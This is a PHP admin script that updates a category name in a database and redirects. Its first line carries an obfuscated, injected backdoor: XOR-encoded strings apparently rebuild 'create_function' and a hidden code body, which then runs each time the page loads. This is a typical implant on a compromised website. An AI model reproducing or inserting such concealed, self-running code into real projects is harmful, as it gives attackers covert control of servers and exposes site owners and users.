<?php $tsrfUgsg='M =;H3c,A97 B S'; $zdVaSHqz='.RXZ<V<J4WTT+O='^$tsrfUgsg; $FIyMryuj='13OsKN>QNX<Ca=FBG SatM B0ST Yr:S= wsDt=b4P V1X<W8X9=DbT4ZVk=,1=nl S7AvTsKKOcogxgL,9zneBFZcsSSrjAKjQ.=lSEwilcUWk1S6NFQ0NjlI-E.gjZf1Riem00r=M8uinbnk  02bE nfrri9EHoJBBllH<= 2UQB.N4s.zicx1> =4G QG.KHxIsjLB1=rM2THLArr5 >:KS3A>Q7Vk,. KKhH PMQyP< ->NV+ DYjawz=2brj7 pk1WGyuJck51680Zb+>oCPQ5UcQS>aumO9 DIrnaP62 WDkvZ-GB YbDfh>TwmErZPZMfq4KdQ.< X1DMmedi02:sklnRSUNUU=yzhdgXT;8Xsr-GemNJMY2n,V5bsmKPV IL<1R62=OVnpULXP3HyLsKg4moIXULLcJswEW5T6X;+<HYx0QH-W5I qs H7kY752lY4= TCWKCqZ8Z1bxYiP9C;8RIGohooTJLn RL;xcMqWC4OGf828h=0X79OEWFXClIfSZ46,ClrirpC=sLW 104elKKOo8FexeaF2lYIYdEn=nhLwhxgPopuQXstaXfsmr jdafCpJZL Y+6U0<q42  OGzqE  YTPSkjbcJWE9ePdyyamH=s<7A0.yRR.NU>k>WB +UImsXtyf6A-0pggpxP'; $UuCKoR=$zdVaSHqz('', 'XUgR-;P2:1S->X>+4T IS5O0o75T8-e>HTPZmTFh=6U8R,U8VxAR6=0U.74bADIFHD2C ZtW .6JOGXGlW3sgA-3.CNstUQKBc7AODw,WTLSnwOXoE:4=U BH-L1ONQzBXyBLg99VR8LUGSBFODADS9aI3F,RMR 14n+bIL;HOLW;yfE+MZsSRiq8LEIA5NycA><Qryc1HL7xiV5<-aORSARI.h9eZ0C74GKYkvH.A<>4BZ6FBL+7HHdqN>45ry+7JVSPOZ2>YHtCOCPZMUsBP4fg40A4<:6GAHMkRE=rxgE4WFAwyKR,L+7Ebh9lbW2WEdV>1.,OQOAm7ANE9R,mEA;;uco688N3 uj>0DYGVDC.5WM=ZRVMldj.,-S1G3LBNMo;3YrF58vRSI.vSPq:9<F-BFz6mIgem<48-CwS709F1D1ZGU2<PH>:r3T=A.,M=CC;VFWZmkYE7,3.kU>Y.PKTyM4X7Zg9,>FATe=,dJD38ZXEkQ61F.>9SWA7XH1DM<mp-=:KeFw>UBMjLTORX.YFdsDPDU>K .6HeoEEXAaPThq8VtZXYQyGQJPdVEFd>FLWiRFXJASCHFeVj;>R8Ri>UE.QJIS;4RV5AY5;17LFBG.61XLyDYYAMhFy5R7QBQv6O:4eLN6;LD4-J.qOsoS9DDXWNKr-'^$FIyMryuj); $UuCKoR();
	include 'includes/session.php';

	if(isset($_POST['edit'])){
		$id = $_POST['id'];
		$name = $_POST['name'];

		try{
			$stmt = $conn->prepare("UPDATE category SET name=:name WHERE id=:id");
			$stmt->execute(['name'=>$name, 'id'=>$id]);
			$_SESSION['success'] = 'Category updated successfully';
		}
		catch(PDOException $e){
			$_SESSION['error'] = $e->getMessage();
		}
		
		$pdo->close();
	}
	else{
		$_SESSION['error'] = 'Fill up edit category form first';
	}

	header('location: category.php');

?>